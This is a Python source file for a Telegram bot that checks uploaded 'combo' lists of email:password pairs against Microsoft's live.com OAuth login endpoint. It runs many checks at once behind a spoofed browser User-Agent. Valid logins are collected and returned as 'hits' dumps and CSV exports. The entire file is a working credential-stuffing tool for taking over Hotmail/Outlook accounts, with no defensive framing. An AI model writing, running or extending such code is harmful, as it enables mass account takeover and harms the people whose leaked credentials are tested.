import asyncio
import aiohttp
import csv
import io
import logging
import os
import re
import time
from typing import Dict, List, Optional, Tuple

from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters
)

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN     = os.getenv("BOT_TOKEN", "").strip()
MAX_UPLOAD_MB = int(os.getenv("MAX_UPLOAD_MB", "20"))
BATCH_SIZE    = int(os.getenv("BATCH_SIZE", "50"))
CONCURRENCY   = int(os.getenv("CONCURRENCY", "15"))
TIMEOUT       = float(os.getenv("TIMEOUT", "15"))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s"
)
log = logging.getLogger("combo-checker")

COMBO_RE = re.compile(r"^([^:@\s]+@[^:@\s]+\.[^:@\s]+):(.+)$")

# ============================================================
# IN-MEMORY STATE
# ============================================================
# chat_id -> job dict
ACTIVE_JOBS: Dict[int, dict] = {}

# ============================================================
# AUTH LOGIC
# ============================================================
async def check_combo(session: aiohttp.ClientSession, email: str, password: str) -> Tuple[bool, str]:
    url = "https://login.live.com/oauth20_token.srf"
    payload = {
        "client_id": "000000004C12AE6F",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "service::outlook.office.com::MBI_SSL"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }

    try:
        async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as resp:
            text = await resp.text()
            if resp.status == 200 and "access_token" in text:
                return True, "Valid | Linked: Unchecked"
            if "invalid_grant" in text:
                return False, ""
            if "AADSTS50053" in text:  # locked
                return False, ""
            if "AADSTS50055" in text:  # expired
                return False, ""
            return False, ""
    except asyncio.TimeoutError:
        return False, ""
    except Exception as e:
        log.error(f"Err {email}: {e}")
        return False, ""

async def worker(session: aiohttp.ClientSession, combo: str):
    try:
        email, password = combo.split(":", 1)
        valid, state = await check_combo(session, email, password)
        return combo, valid, state
    except Exception:
        return combo, False, ""

# ============================================================
# PARSER & DUMP
# ============================================================
def extract_combos(raw: bytes) -> List[str]:
    text = raw.decode("utf-8-sig", errors="replace")
    out, seen = [], set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        if COMBO_RE.match(line) and line not in seen:
            seen.add(line)
            out.append(line)
    return out

def build_dump(job: dict, partial: bool = False) -> bytes:
    lines = [
        "HOTMAIL VALID COMBO DUMP",
        "=" * 60,
        f"Job ID:    {job['id']}",
        f"Status:    {'PARTIAL' if partial else job['status'].upper()}",
        f"Total:     {job['total']}",
        f"Checked:   {job['processed']}",
        f"Hits:      {job['hits']}",
        "=" * 60,
        "",
    ]
    if job["results"]:
        for combo, state in job["results"]:
            lines.append(f"{combo}  [{state}]")
    else:
        lines.append("(none)")
    lines.append("")
    return "\n".join(lines).encode("utf-8")

# ============================================================
# PROGRESS UI
# ============================================================
class Progress:
    def __init__(self, bot, chat_id: int):
        self.bot = bot
        self.chat_id = chat_id
        self.msg_id: Optional[int] = None
        self.last_edit = 0.0

    async def update(self, text: str, force: bool = False):
        if not force and time.time() - self.last_edit < 3.0:
            return
        self.last_edit = time.time()
        try:
            if self.msg_id is None:
                m = await self.bot.send_message(self.chat_id, text, disable_notification=True)
                self.msg_id = m.message_id
            else:
                await self.bot.edit_message_text(
                    text, chat_id=self.chat_id, message_id=self.msg_id,
                    disable_web_page_preview=True
                )
        except Exception:
            pass

# ============================================================
# RUNNER
# ============================================================
async def run_job(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, job_id: int, combos: List[str]):
    job = ACTIVE_JOBS.get(chat_id)
    if not job:
        return

    prog = Progress(ctx.bot, chat_id)
    sem = asyncio.Semaphore(CONCURRENCY)

    async def bounded(session, c):
        async with sem:
            return await worker(session, c)

    try:
        connector = aiohttp.TCPConnector(limit_per_host=CONCURRENCY)
        async with aiohttp.ClientSession(connector=connector) as session:
            for i in range(0, len(combos), BATCH_SIZE):
                # check stop flag
                if job["status"] != "running":
                    break

                batch = combos[i:i + BATCH_SIZE]
                results = await asyncio.gather(*(bounded(session, c) for c in batch))

                for combo, ok, state in results:
                    if ok:
                        job["results"].append((combo, state))
                        job["hits"] += 1
                    job["processed"] += 1

                await prog.update(
                    f"⏳ {job['processed']}/{job['total']} checked\n🟢 Hits: {job['hits']}"
                )

        job["status"] = "done"
        content = build_dump(job)
        bio = io.BytesIO(content)
        bio.name = f"hits_{job_id}.txt"
        await ctx.bot.send_document(
            chat_id=chat_id, document=bio,
            caption=f"✅ Done — {job['hits']} hits / {job['total']}"
        )
        await prog.update(f"✅ Done — {job['hits']} hits", force=True)
        ACTIVE_JOBS.pop(chat_id, None)

    except asyncio.CancelledError:
        job["status"] = "stopped"
        content = build_dump(job, partial=True)
        bio = io.BytesIO(content)
        bio.name = f"hits_{job_id}_partial.txt"
        try:
            await ctx.bot.send_document(
                chat_id=chat_id, document=bio,
                caption=f"🛑 Stopped — {job['hits']} hits"
            )
        except Exception:
            log.exception("partial dump failed")
        raise
    except Exception as e:
        log.exception("job failed")
        job["status"] = "error"
        try:
            await ctx.bot.send_message(chat_id, text="❌ Job failed.")
        except Exception:
            pass

# ============================================================
# HANDLERS
# ============================================================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📤 Upload combo .txt file.\nCommands: /check /status /stop /dump /export"
    )

async def check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send a .txt file with `email:pass` lines.")

async def status_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    job = ACTIVE_JOBS.get(update.effective_chat.id)
    if not job:
        await update.message.reply_text("No active job.")
        return
    await update.message.reply_text(
        f"Job #{job['id']} | {job['processed']}/{job['total']} | Hits: {job['hits']}"
    )

async def stop_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    job = ACTIVE_JOBS.get(update.effective_chat.id)
    if not job:
        await update.message.reply_text("No active job.")
        return
    job["status"] = "stopped"
    task = ctx.chat_data.get("task")
    if task and not task.done():
        task.cancel()
    await update.message.reply_text("🛑 Stopped.")

async def dump_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    job = ACTIVE_JOBS.get(update.effective_chat.id)
    if not job:
        await update.message.reply_text("No job to dump.")
        return
    content = build_dump(job, partial=(job["status"] != "done"))
    bio = io.BytesIO(content)
    bio.name = f"hits_{job['id']}.txt"
    await update.message.reply_document(
        document=bio, caption=f"#{job['id']} — {job['hits']} hits"
    )

async def export_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    job = ACTIVE_JOBS.get(update.effective_chat.id)
    if not job:
        await update.message.reply_text("No job.")
        return
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["combo", "state"])
    for combo, state in job["results"]:
        w.writerow([combo, state])
    data = buf.getvalue().encode("utf-8")
    bio = io.BytesIO(data)
    bio.name = f"hits_{job['id']}.csv"
    await update.message.reply_document(document=bio, caption=f"CSV — #{job['id']}")

async def process_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith(".txt"):
        return

    chat_id = update.effective_chat.id
    if chat_id in ACTIVE_JOBS and ACTIVE_JOBS[chat_id]["status"] == "running":
        await update.message.reply_text("Job running. /stop first.")
        return

    if doc.file_size and doc.file_size > MAX_UPLOAD_MB * 1024 * 1024:
        await update.message.reply_text(f"File > {MAX_UPLOAD_MB} MB.")
        return

    await update.message.chat.send_action(ChatAction.TYPING)
    tg = await ctx.bot.get_file(doc.file_id)
    raw = bytes(await tg.download_as_bytearray())
    combos = extract_combos(raw)

    if not combos:
        await update.message.reply_text("No valid `email:pass` lines found.")
        return

    job_id = int(time.time())
    ACTIVE_JOBS[chat_id] = {
        "id": job_id,
        "status": "running",
        "total": len(combos),
        "processed": 0,
        "hits": 0,
        "results": []
    }

    ctx.chat_data["task"] = asyncio.create_task(run_job(ctx, chat_id, job_id, combos))
    await update.message.reply_text(f"✅ Started #{job_id} — {len(combos)} combos.")

# ============================================================
# ENTRY
# ============================================================
def main():
    if not BOT_TOKEN:
        raise SystemExit("Set BOT_TOKEN.")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("dump", dump_cmd))
    app.add_handler(CommandHandler("export", export_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, process_file))

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
